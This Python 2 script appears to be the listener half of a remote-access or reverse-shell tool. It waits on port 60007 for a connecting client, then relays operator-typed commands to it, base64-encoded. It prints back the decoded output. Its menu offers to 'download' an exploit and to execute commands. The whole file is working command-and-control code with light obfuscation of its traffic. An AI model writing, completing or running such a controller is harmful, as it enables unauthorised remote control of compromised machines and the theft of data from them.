# server.py



import socket                   # Import socket module
import base64
import sys
import os


# Decode Base64 data
def decode(data):
    if len(data) % 4 != 0:  # check if multiple of 4
        while len(data) % 4 != 0:
            data = data + "="
        req_str = base64.b64decode(data)
    else:
        req_str = base64.b64decode(data)
    return req_str
 
 
def optionb(con, cmd):
    con.send(base64.b64encode(cmd))
    data = con.recv(8192)
    req_str = decode(data)
    return req_str


port = 60007                    # Reserve a port for your service.
s = socket.socket()             # Create a socket object
host = socket.gethostname()     # Get local machine name
s.bind((host, port))            # Bind to the port
s.listen(5)                     # Now wait for client connection.

print 'Server listening....'

while True:
    conn, addr = s.accept()     # Establish connection with client.
    print 'Got connection from', addr
    data = conn.recv(1024)
    print('Server received', repr(data))


    while True:
        print(
            '''
        Menu:
            \n\tDownload for rertieving the exploit.
            \n\tExecute a normal command.
            '''
        )
        cmd = raw_input("Enter Command: ")
        if cmd:
            if cmd == "quit":
                break
            req_str = optionb(conn, cmd)
            print >>sys.stderr, ''
            print >>sys.stderr, '%s' % req_str
            print >>sys.stderr, ''


    conn.send('Thank you for connecting')
    conn.close()
    exit()

